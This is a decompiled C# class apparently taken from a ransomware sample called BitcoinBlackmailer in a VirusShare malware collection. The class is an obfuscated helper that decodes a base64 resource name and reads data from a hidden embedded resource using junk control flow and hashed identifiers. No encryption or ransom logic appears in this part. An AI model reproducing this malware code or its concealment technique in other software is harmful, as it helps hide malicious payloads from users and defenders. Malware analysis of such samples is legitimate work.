// Decompiled with JetBrains decompiler
// Type: A.c001bc1b0517549452b8f4e72309b6c25
// Assembly: BitcoinBlackmailer, Version=2.4.5.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C6D3383-405F-454B-A25B-FBC4B1EC529F
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.Win32.Scar.oenx-0b164fc0270c83f0d5c3ac554421cfbccd0404ae7c79f700aa485fdf86912ef4.exe

using System;
using System.Reflection;
using System.Text;

namespace A
{
  internal class c001bc1b0517549452b8f4e72309b6c25
  {
    internal static readonly byte[] c6f1245b2b577de276af81e10ab5e619a;
    internal readonly int c821ca61cc8f1c76be955497cfa662d48;

    static c001bc1b0517549452b8f4e72309b6c25()
    {
      if (c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a != null)
        return;
label_1:
      switch (3)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (c001bc1b0517549452b8f4e72309b6c25.\u002Ecctor);
          }
          byte[] bytes = Convert.FromBase64String("Qml0Y29pbkJsYWNrbWFpbGVyJQ==");
          string name = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
          c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a = c3c2c7ed57c9be715407a91dab22fc681.c8cd1f2364f9d323fc7cd6a27b2293cc4(97L, Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
          break;
      }
    }

    internal static int cd3f060e98751c590ecec99965b0fe2c5(int c980f211b86b1c0f5e30f85826b75f0fd) => BitConverter.ToInt32(c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a, c980f211b86b1c0f5e30f85826b75f0fd);

    internal static long cb63eea1ed3f993c55f531f79768e493c(int c980f211b86b1c0f5e30f85826b75f0fd) => BitConverter.ToInt64(c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a, c980f211b86b1c0f5e30f85826b75f0fd);

    internal static float c4ea09c8b50396ec7b8a7dd702692ae2c(int c980f211b86b1c0f5e30f85826b75f0fd) => BitConverter.ToSingle(c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a, c980f211b86b1c0f5e30f85826b75f0fd);

    internal static double ce41a0cd5165488258e982191c682fc79(int c980f211b86b1c0f5e30f85826b75f0fd) => BitConverter.ToDouble(c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a, c980f211b86b1c0f5e30f85826b75f0fd);

    internal static void c335df1cc4c987afea9bb71434b7b806c(
      Array ca5fd702da1f93f36abecee9a3fdb063e,
      int c980f211b86b1c0f5e30f85826b75f0fd)
    {
      int count;
      if (((int) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a[c980f211b86b1c0f5e30f85826b75f0fd] & 128) == 0)
      {
label_1:
        switch (5)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (c001bc1b0517549452b8f4e72309b6c25.c335df1cc4c987afea9bb71434b7b806c);
            }
            count = (int) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a[c980f211b86b1c0f5e30f85826b75f0fd];
            ++c980f211b86b1c0f5e30f85826b75f0fd;
            break;
        }
      }
      else if (((int) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a[c980f211b86b1c0f5e30f85826b75f0fd] & 64) == 0)
      {
label_6:
        switch (2)
        {
          case 0:
            goto label_6;
          default:
            count = ((int) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a[c980f211b86b1c0f5e30f85826b75f0fd] & -129) << 8 | (int) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a[c980f211b86b1c0f5e30f85826b75f0fd + 1];
            c980f211b86b1c0f5e30f85826b75f0fd += 2;
            break;
        }
      }
      else
      {
        count = ((int) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a[c980f211b86b1c0f5e30f85826b75f0fd] & -193) << 24 | (int) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a[c980f211b86b1c0f5e30f85826b75f0fd + 1] << 16 | (int) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a[c980f211b86b1c0f5e30f85826b75f0fd + 2] << 8 | (int) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a[c980f211b86b1c0f5e30f85826b75f0fd + 3];
        c980f211b86b1c0f5e30f85826b75f0fd += 4;
      }
      if (count < 1)
      {
label_10:
        switch (4)
        {
          case 0:
            goto label_10;
        }
      }
      else
        Buffer.BlockCopy((Array) c001bc1b0517549452b8f4e72309b6c25.c6f1245b2b577de276af81e10ab5e619a, c980f211b86b1c0f5e30f85826b75f0fd, ca5fd702da1f93f36abecee9a3fdb063e, 0, count);
    }
  }
}
